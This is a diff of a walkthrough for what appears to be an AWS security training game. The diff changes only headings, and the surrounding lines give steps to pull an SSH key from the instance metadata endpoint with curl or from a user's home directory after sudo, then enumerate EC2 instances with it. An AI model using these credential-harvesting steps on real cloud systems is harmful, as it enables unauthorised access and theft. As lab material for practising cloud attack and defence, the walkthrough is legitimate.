@@ -13,7 +13,7 @@ $ `ssh eviluser@$instance_ip`
 Log into the instance to look around.
 
 
-## Route 1: Use the metadata server to get the key
+## Route 1: Use the metadata server to get the key
 
 $ `curl 169.254.169.254/latest/user-data`
 
@@ -25,7 +25,7 @@ $ `vim ssh_key.pem; chmod 400 ssh_key.pem`
 Write the key in a file and set the permissions for SSH to accept it.
 
 
-## Route 2: Look around in the linux system to get the key
+## Route 2: Look around in the linux system to get the key
 
 $ `sudo su`
 
@@ -37,7 +37,7 @@ $ `cd /home/ec2-user; chmod 400 AWS-secgame-mission2-keypair-Evilcorp-Evilkeypai
 The key is stored in the home dir.
 
 
-## Once the SSH key is obtained
+## Once the SSH key is obtained
 
 $ `aws --region us-east-1 ec2 describe-instances`
 
